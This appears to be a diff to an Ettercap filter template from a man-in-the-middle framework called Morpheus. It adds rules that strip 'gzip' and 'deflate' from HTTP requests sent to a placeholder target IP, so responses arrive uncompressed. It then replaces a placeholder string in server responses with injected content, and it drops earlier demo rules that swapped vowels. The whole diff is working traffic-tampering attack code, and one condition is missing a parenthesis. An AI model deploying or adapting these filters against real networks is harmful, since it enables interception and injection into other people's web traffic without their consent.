@@ -16,37 +16,37 @@
 ##
 
 
+
+
+##########################
+## Zap Content Encoding ##
+##########################
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
+  msg("[morpheus] host:IpAdDR   [ <> ]  found...");
+  msg("[Morpheus] | status: replacing packet content!");
+  if (search(DATA.data, "gzip")) {
+    replace("gzip", "    "); # note: four spaces In the replacement string
+    msg("[Morpheus] |  packet string gzip zapped ✔");
+  }
+}
+
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "deflate")) {
+    replace("deflate", "       "); # note: seven spaces In the replacement string
+    msg("[Morpheus] |  packet string deflate zapped ✔");
+  }
+}
+
+
+
+
 #####################
 ## Replace Content ##
 #####################
-# replace the word 'a' by 'f'
-if (ip.proto == TCP && search(DATA.data, "a")){
- replace("a", "f");
- msg("[Morpheus] A zapped from request...\n");
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.src == 80) {
+  if search(DATA.data, "RePlAcE")){
+    replace("RePlAcE", "InJeC"); # note: replacement string must have the same length of injected one.
+    msg("[morpheus] |_ packet forward back to target ✔\n");
+  }
 }
 
-# replace the word 'e' by 'h'
-if (ip.proto == TCP && search(DATA.data, "e")){
- replace("e", "h");
- msg("[Morpheus] E zapped from request...\n");
-}
-
-
-# replace the word 'i' by 'k'
-if (ip.proto == TCP && search(DATA.data, "i")){
- replace("i", "k");
- msg("[Morpheus] I zapped from request...\n");
-}
-
-
-# replace the word 'o' by 's'
-if (ip.proto == TCP && search(DATA.data, "o")){
- replace("o", "s");
- msg("[Morpheus] O zapped from request...\n");
-}
-
-# replace the word 'u' by 'x'
-if (ip.proto == TCP && search(DATA.data, "u")){
- replace("u", "x");
- msg("[Morpheus] U zapped from request...\n");
-}
